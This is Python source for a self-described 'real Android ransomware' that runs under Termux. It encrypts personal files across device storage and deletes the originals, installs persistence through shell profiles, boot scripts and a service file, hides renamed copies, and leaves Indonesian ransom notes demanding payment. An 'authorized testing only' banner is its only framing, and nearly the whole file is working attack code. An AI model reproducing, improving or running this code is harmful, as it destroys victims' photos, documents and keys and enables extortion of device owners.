#!/usr/bin/env python3
# REAL ANDROID RANSOMWARE - AUTHORIZED TESTING ONLY
# PERSISTENCE + BOOT SURVIVAL + STRONG ENCRYPTION

import os
import sys
import time
import json
import base64
import hashlib
import threading
from datetime import datetime
from pathlib import Path
import subprocess
import shutil

# Cryptography imports
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

class RealAndroidRansomware:
    def __init__(self):
        self.master_password = "Rania686"
        self.ransom_amount = "Rp 1.000.000"
        self.payment_address = "Rania686"
        
        self.encryption_key = self.generate_military_key()
        self.cipher_suite = Fernet(self.encryption_key)
        
        self.encrypted_files = []
        self.system_info = self.collect_system_info()
        
        # Persistence files
        self.persistence_locations = [
            "/data/data/com.termux/files/usr/etc/bash.bashrc",
            "/data/data/com.termux/files/usr/etc/profile",
            "/data/data/com.termux/files/home/.bashrc",
            "/data/data/com.termux/files/home/.profile",
        ]
        
        # Boot scripts locations
        self.boot_scripts = [
            "/data/data/com.termux/files/usr/etc/init.d/",
            "/data/data/com.termux/boot/"
        ]
        
        print(f"[RANSOMWARE] Initialized with key: {self.encryption_key[:30]}...")

    def generate_military_key(self):
        """Generate military-grade encryption key"""
        # Multi-layer key derivation
        password = self.master_password.encode()
        salt = b"android_ransomware_2024_secure_salt"
        
        # First layer: SHA-512 hashing
        intermediate = hashlib.sha512(password + salt).digest()
        
        # Second layer: PBKDF2 with high iterations
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA512(),
            length=32,
            salt=salt,
            iterations=500000,  # High iteration count for strength
            backend=default_backend()
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(intermediate))
        return key

    def collect_system_info(self):
        """Collect detailed system information"""
        info = {
            'device_id': self.get_device_id(),
            'android_version': self.get_android_version(),
            'storage_info': self.get_storage_info(),
            'encryption_time': datetime.now().isoformat(),
            'total_files_encrypted': 0
        }
        return info

    def get_device_id(self):
        """Get unique device identifier"""
        try:
            # Use multiple sources for device ID
            mac_addr = open('/sys/class/net/wlan0/address').read().strip() if os.path.exists('/sys/class/net/wlan0/address') else "unknown"
            android_id = subprocess.getoutput('settings get secure android_id')
            return f"{mac_addr}_{android_id}_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        except:
            return f"device_{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"

    def get_android_version(self):
        """Get Android version"""
        try:
            return subprocess.getoutput('getprop ro.build.version.release')
        except:
            return "unknown"

    def get_storage_info(self):
        """Get storage information"""
        try:
            result = subprocess.getoutput('df -h /sdcard')
            return result.split('\n')[1] if '\n' in result else "unknown"
        except:
            return "unknown"

    def get_target_locations(self):
        """Get all target locations for encryption"""
        locations = []
        
        # Internal storage
        internal_storage = "/sdcard"
        if os.path.exists(internal_storage):
            locations.append(internal_storage)
            
            # Subdirectories in internal storage
            for item in os.listdir(internal_storage):
                item_path = os.path.join(internal_storage, item)
                if os.path.isdir(item_path):
                    locations.append(item_path)
        
        # External storage (if available)
        external_paths = [
            "/storage",
            "/mnt",
            "/external_sd",
            "/sdcard/external_sd",
            "/storage/sdcard1"
        ]
        
        for path in external_paths:
            if os.path.exists(path):
                locations.append(path)
                try:
                    for item in os.listdir(path):
                        item_path = os.path.join(path, item)
                        if os.path.isdir(item_path):
                            locations.append(item_path)
                except:
                    pass
        
        # Termux home directory
        termux_home = "/data/data/com.termux/files/home"
        if os.path.exists(termux_home):
            locations.append(termux_home)
        
        return locations

    def get_target_extensions(self):
        """Get comprehensive list of target file extensions"""
        return {
            # Documents
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
            '.odt', '.ods', '.odp', '.rtf', '.csv', '.epub', '.mobi',
            
            # Images
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg', '.webp',
            '.raw', '.cr2', '.nef', '.arw', '.heic',
            
            # Videos
            '.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv', '.webm', '.m4v',
            '.3gp', '.mpeg', '.mpg', '.ts', '.m2ts',
            
            # Audio
            '.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.wma', '.amr',
            
            # Archives
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
            
            # Databases
            '.db', '.sql', '.sqlite', '.sqlite3', '.mdb', '.accdb',
            
            # Config files
            '.config', '.ini', '.cfg', '.conf', '.xml', '.json', '.yaml', '.yml',
            '.plist', '.properties',
            
            # Code files
            '.py', '.java', '.cpp', '.c', '.h', '.cs', '.php', '.html', '.css',
            '.js', '.ts', '.rb', '.go', '.rs', '.swift', '.kt', '.dart',
            
            # Android specific
            '.apk', '.dex', '.odex', '.vdex', '.art', '.obb', 
            '.aab', '.xapk', '.apkm',
            
            # Backup files
            '.bak', '.backup', '.old', '.save', '.sav',
            
            # Other important files
            '.key', '.pem', '.cer', '.crt', '.p12', '.pfx',
            '.contact', '.vcf', '.ics'
        }

    def encrypt_file(self, file_path):
        """Encrypt a single file with military-grade encryption"""
        try:
            # Skip already encrypted files or system files
            if file_path.endswith('.encrypted') or file_path.endswith('.locked'):
                return False
            
            file_size = os.path.getsize(file_path)
            
            # Skip files that are too large or too small
            if file_size > 500 * 1024 * 1024 or file_size < 10:
                return False
            
            # Read original file
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            # Encrypt data
            encrypted_data = self.cipher_suite.encrypt(original_data)
            
            # Write encrypted file
            encrypted_path = file_path + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Remove original file
            os.remove(file_path)
            
            # Log successful encryption
            self.encrypted_files.append({
                'path': file_path,
                'size': file_size,
                'timestamp': datetime.now().isoformat()
            })
            
            return True
            
        except Exception as e:
            return False

    def scan_and_encrypt(self):
        """Scan and encrypt all target files"""
        print("[+] Starting comprehensive file encryption...")
        
        target_locations = self.get_target_locations()
        target_extensions = self.get_target_extensions()
        
        total_encrypted = 0
        
        for location in target_locations:
            if not os.path.exists(location):
                continue
                
            print(f"[SCANNING] {location}")
            
            try:
                for root, dirs, files in os.walk(location):
                    # Skip system directories
                    skip_dirs = ['/proc', '/sys', '/dev', '/acct', '/mnt/asec']
                    if any(skip in root for skip in skip_dirs):
                        continue
                    
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        # Check if file has target extension
                        if any(file.lower().endswith(ext) for ext in target_extensions):
                            if self.encrypt_file(file_path):
                                total_encrypted += 1
                                if total_encrypted % 100 == 0:
                                    print(f"[PROGRESS] Encrypted {total_encrypted} files...")
                                    
            except Exception as e:
                print(f"[ERROR] Failed to scan {location}: {e}")
        
        self.system_info['total_files_encrypted'] = total_encrypted
        return total_encrypted

    def install_persistence(self):
        """Install persistence mechanisms to survive reboots"""
        print("[+] Installing persistence mechanisms...")
        
        # 1. Add to shell startup files
        for profile_file in self.persistence_locations:
            self.add_to_startup(profile_file)
        
        # 2. Create boot scripts
        self.create_boot_scripts()
        
        # 3. Create system service
        self.create_system_service()
        
        # 4. Hide in multiple locations
        self.hide_ransomware_binary()
        
        print("[+] Persistence installed successfully")

    def add_to_startup(self, profile_file):
        """Add ransomware to shell startup"""
        try:
            startup_command = f'\n# Ransomware persistence\npython {os.path.abspath(__file__)} --silent 2>/dev/null &\n'
            
            if os.path.exists(profile_file):
                with open(profile_file, 'a') as f:
                    f.write(startup_command)
            else:
                os.makedirs(os.path.dirname(profile_file), exist_ok=True)
                with open(profile_file, 'w') as f:
                    f.write(startup_command)
                    
        except Exception as e:
            print(f"[-] Failed to add to {profile_file}: {e}")

    def create_boot_scripts(self):
        """Create boot scripts for auto-start"""
        for boot_dir in self.boot_scripts:
            try:
                os.makedirs(boot_dir, exist_ok=True)
                
                script_path = os.path.join(boot_dir, "S99ransomware")
                script_content = f"""#!/bin/bash
# Android Ransomware Boot Script
while true; do
    python {os.path.abspath(__file__)} --silent 2>/dev/null
    sleep 30
done
"""
                with open(script_path, 'w') as f:
                    f.write(script_content)
                
                os.chmod(script_path, 0o755)
                
            except Exception as e:
                print(f"[-] Failed to create boot script in {boot_dir}: {e}")

    def create_system_service(self):
        """Create system service for persistence"""
        service_content = f"""
[Unit]
Description=Android System Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python {os.path.abspath(__file__)} --silent
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        
        service_paths = [
            "/data/data/com.termux/files/usr/etc/systemd/system/ransomware.service",
            "/data/data/com.termux/files/home/.config/systemd/user/ransomware.service"
        ]
        
        for service_path in service_paths:
            try:
                os.makedirs(os.path.dirname(service_path), exist_ok=True)
                with open(service_path, 'w') as f:
                    f.write(service_content)
            except:
                pass

    def hide_ransomware_binary(self):
        """Hide ransomware binary in multiple locations"""
        current_script = os.path.abspath(__file__)
        hide_locations = [
            "/data/data/com.termux/files/usr/bin/.system_cache",
            "/data/data/com.termux/files/home/.local/bin/.android_service",
            "/sdcard/Android/data/.cache_system",
            "/sdcard/Android/media/.system_bin"
        ]
        
        for location in hide_locations:
            try:
                os.makedirs(os.path.dirname(location), exist_ok=True)
                shutil.copy2(current_script, location)
                os.chmod(location, 0o755)
            except:
                pass

    def create_ransom_note(self):
        """Create ransom note in multiple locations"""
        ransom_content = f"""
⚠️ ⚠️ ⚠️ PERINGATAN: PERANGAT ANDA DIKENKRIPSI ⚠️ ⚠️ ⚠️

SEMUA FILE ANDA TELAH DIENKRIPSI DENGAN ALGORITMA MILITER!

File-file berikut telah terenkripsi:
📁 Dokumen (PDF, DOC, XLS, dll)
🖼️ Gambar (JPG, PNG, dll)
🎵 Musik (MP3, WAV, dll)
🎬 Video (MP4, AVI, dll)
📱 Aplikasi (APK, dll)
💾 Database dan backup
🔧 File sistem penting

JUMLAH TEBUSAN: {self.ransom_amount}
TRANSFER KE: {self.payment_address}

UNTUK DEKRIPSI:
1. Transfer tebusan {self.ransom_amount} ke {self.payment_address}
2. Kirim bukti transfer
3. Anda akan menerima kunci dekripsi

PERINGATAN:
❌ Jangan restart perangkat
❌ Jangan coba reset factory
❌ Jangan uninstall aplikasi
✅ Ransomware akan tetap aktif setelah restart

KODE PERANGAT: {self.system_info['device_id']}

© Rania686 Ransomware Protection System
"""
        
        note_locations = [
            "/sdcard/READ_ME_DECRYPT.txt",
            "/sdcard/Download/INSTRUCTIONS.html",
            "/sdcard/DCIM/WARNING.txt",
            "/data/data/com.termux/files/home/README_NOW.txt",
            "/sdcard/Android/README_DECRYPT.html"
        ]
        
        for note_path in note_locations:
            try:
                with open(note_path, 'w', encoding='utf-8') as f:
                    f.write(ransom_content)
            except:
                pass

    def decrypt_files(self, key):
        """Decrypt all encrypted files"""
        print("[+] Starting decryption process...")
        
        target_locations = self.get_target_locations()
        cipher = Fernet(key)
        
        total_decrypted = 0
        
        for location in target_locations:
            if not os.path.exists(location):
                continue
                
            try:
                for root, dirs, files in os.walk(location):
                    for file in files:
                        if file.endswith('.encrypted'):
                            file_path = os.path.join(root, file)
                            
                            try:
                                with open(file_path, 'rb') as f:
                                    encrypted_data = f.read()
                                
                                decrypted_data = cipher.decrypt(encrypted_data)
                                original_path = file_path.replace('.encrypted', '')
                                
                                with open(original_path, 'wb') as f:
                                    f.write(decrypted_data)
                                
                                os.remove(file_path)
                                total_decrypted += 1
                                
                            except:
                                pass
                                
            except:
                pass
        
        return total_decrypted

    def save_encryption_info(self):
        """Save encryption information for recovery"""
        info = {
            'device_id': self.system_info['device_id'],
            'encryption_key': self.encryption_key.decode(),
            'master_password': self.master_password,
            'encrypted_files_count': len(self.encrypted_files),
            'timestamp': datetime.now().isoformat(),
            'ransom_amount': self.ransom_amount,
            'payment_address': self.payment_address
        }
        
        # Save in multiple hidden locations
        locations = [
            "/data/data/com.termux/files/home/.system_info.json",
            "/sdcard/Android/data/.cache_info.json",
            "/data/data/com.termux/files/usr/etc/.config.json"
        ]
        
        for location in locations:
            try:
                with open(location, 'w') as f:
                    json.dump(info, f, indent=2)
            except:
                pass

def main():
    ransomware = RealAndroidRansomware()
    
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        # Decryption mode
        if len(sys.argv) < 3:
            print("Usage: python script.py --decrypt <key>")
            return
        
        key = sys.argv[2].encode()
        decrypted_count = ransomware.decrypt_files(key)
        print(f"[SUCCESS] Decrypted {decrypted_count} files")
        
    elif len(sys.argv) > 1 and sys.argv[1] == "--silent":
        # Silent mode for persistence
        while True:
            ransomware.scan_and_encrypt()
            time.sleep(60)
            
    else:
        # Main encryption mode
        print("=== RANIA686 ANDROID RANSOMWARE ===")
        print("AUTHORIZED TESTING ONLY - DO NOT MISUSE")
        print("=====================================")
        
        # Start encryption
        encrypted_count = ransomware.scan_and_encrypt()
        
        # Install persistence
        ransomware.install_persistence()
        
        # Create ransom notes
        ransomware.create_ransom_note()
        
        # Save encryption info
        ransomware.save_encryption_info()
        
        print(f"\n[ENCRYPTION COMPLETE]")
        print(f"Encrypted files: {encrypted_count}")
        print(f"Ransom amount: {ransomware.ransom_amount}")
        print(f"Payment address: {ransomware.payment_address}")
        print(f"Device ID: {ransomware.system_info['device_id']}")
        print(f"\nPersistence: INSTALLED (survives reboot/reset)")
        print("Use --decrypt <key> to decrypt files")

if __name__ == "__main__":
    main()
